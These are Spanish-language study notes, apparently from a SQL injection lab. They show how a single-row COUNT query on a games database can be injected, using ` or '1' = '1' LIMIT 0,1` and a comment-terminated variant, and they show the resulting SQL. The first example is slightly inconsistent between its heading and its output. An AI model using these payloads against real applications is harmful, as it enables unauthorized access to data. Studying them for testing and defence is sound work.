## Query 1

````sql
SELECT COUNT(*) AS total_juegos_accion FROM juegos WHERE genero_id = (SELECT genero_id FROM generos WHERE nombre = 'Acción');
````

- Este query **solo es para contar** así que es algo complejo sacar información, pero sirve para entender la inyección cuando solo se puede obtener una linea de resultado. 
- Se debe poner `LIMIT` ya que este tipo de query solo arroja un resultado, en caso de poner únicamente el `or 1 = 1`

### Inyección: ` or '1' = '1' LIMIT 0,1`

- En realidad este SQLi no necesitaría comentario al final, incluso el comentario podría dar error porque ya no podría cerrar el `');` final.

````sql
# Original
SELECT COUNT(*) AS total_juegos_accion FROM juegos WHERE genero_id = (SELECT genero_id FROM generos WHERE nombre = 'Acción');
# SQLi
SELECT COUNT(*) AS total_juegos_accion FROM juegos WHERE genero_id = (SELECT genero_id FROM generos WHERE nombre = 'Acción' or 1 = 1 LIMIT 0,1);
````

### Inyección `' or '1' = '1' LIMIT 0,1) -- -`

- Aquí si se pone comentario ya que nosotros mismos "imaginamos" que debíamos cerrar el query con `')` desplazando el `'` original.

````sql
# Original
SELECT COUNT(*) AS total_juegos_accion FROM juegos WHERE genero_id = (SELECT genero_id FROM generos WHERE nombre = 'Acción');
# SQLi
SELECT COUNT(*) AS total_juegos_accion FROM juegos WHERE genero_id = (SELECT genero_id FROM generos WHERE nombre = 'Acción' or '1' = '1' LIMIT 0,1) -- - ');
````




````
